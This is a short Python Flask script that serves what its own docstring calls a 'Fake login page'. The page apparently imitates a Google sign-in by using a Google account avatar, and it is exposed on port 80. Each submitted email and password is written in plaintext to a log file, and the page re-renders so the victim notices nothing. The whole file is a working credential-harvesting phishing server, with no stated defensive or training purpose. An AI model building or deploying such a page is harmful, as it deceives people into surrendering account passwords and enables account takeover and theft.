"""Runs simple login page. Requires root."""

from flask import Flask, render_template, request

# Run a very simple Flask server.
app = Flask(__name__)
logfile = "logs/currentlog.log"

# Include urls to use on the login template.
assets = dict()
assets["bootstrap"] = "https://maxcdn.bootstrapcdn.com/bootstrap/" + \
    "3.3.7/css/bootstrap.min.css"
assets["avatar"] = "https://ssl.gstatic.com/accounts/ui/avatar_2x.png"
assets["jquery"] = "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/" + \
    "jquery.min.js"

# Serve paths for our application.


@app.route("/", methods=["POST", "GET"])
def login():
    """Fake login page."""
    if request.method == "POST":
        with open(logfile, 'a') as f:
            # Log the login attempt. Warning: no log rotation.
            entry = request.form["email"] + ": " + request.form["password"]
            f.write(entry + '\n')

    # Page is always rendered no matter the contents.
    return render_template('login.html', assets=assets)


if __name__ == "__main__":
    # This will require sudo/root.
    app.run('0.0.0.0', port=80, debug=False)
